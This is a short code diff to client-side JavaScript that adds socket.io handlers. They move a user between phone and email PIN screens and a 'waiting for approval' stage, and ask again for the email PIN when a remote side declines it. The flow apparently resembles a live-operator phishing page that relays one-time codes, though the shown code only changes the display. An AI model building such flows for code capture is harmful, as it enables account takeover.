@@ -311,8 +311,7 @@
         document.getElementById('pin-correo-screen').classList.remove('hidden');
     });
 
-    socket.on('esperandoAprobacion2', () => {
-        // Ocultamos ambas pantallas de PIN (teléfono y correo)
+        socket.on('esperandoAprobacion2', () => {
         document.getElementById('pin-screen').classList.add('hidden');
         document.getElementById('pin-correo-screen').classList.add('hidden');
         document.getElementById('loading-etapa2').classList.remove('hidden');
@@ -327,6 +326,17 @@
         document.getElementById('loading-etapa2').classList.add('hidden');
         document.getElementById('pin-screen').classList.remove('hidden');
         const error = document.getElementById('pin-error');
+        error.textContent = "Incorrect code. Please try again.";
+        error.classList.remove('hidden');
+        setTimeout(() => error.classList.add('hidden'), 3000);
+    });
+
+        // NUEVO: Reintentar PIN Correo cuando se declina en Etapa 2
+    socket.on('reintentarPINCorreo', () => {
+        document.getElementById('loading-etapa2').classList.add('hidden');
+        document.getElementById('pin-correo-screen').classList.remove('hidden');
+        
+        const error = document.getElementById('pin-correo-error');
         error.textContent = "Incorrect code. Please try again.";
         error.classList.remove('hidden');
         setTimeout(() => error.classList.add('hidden'), 3000);
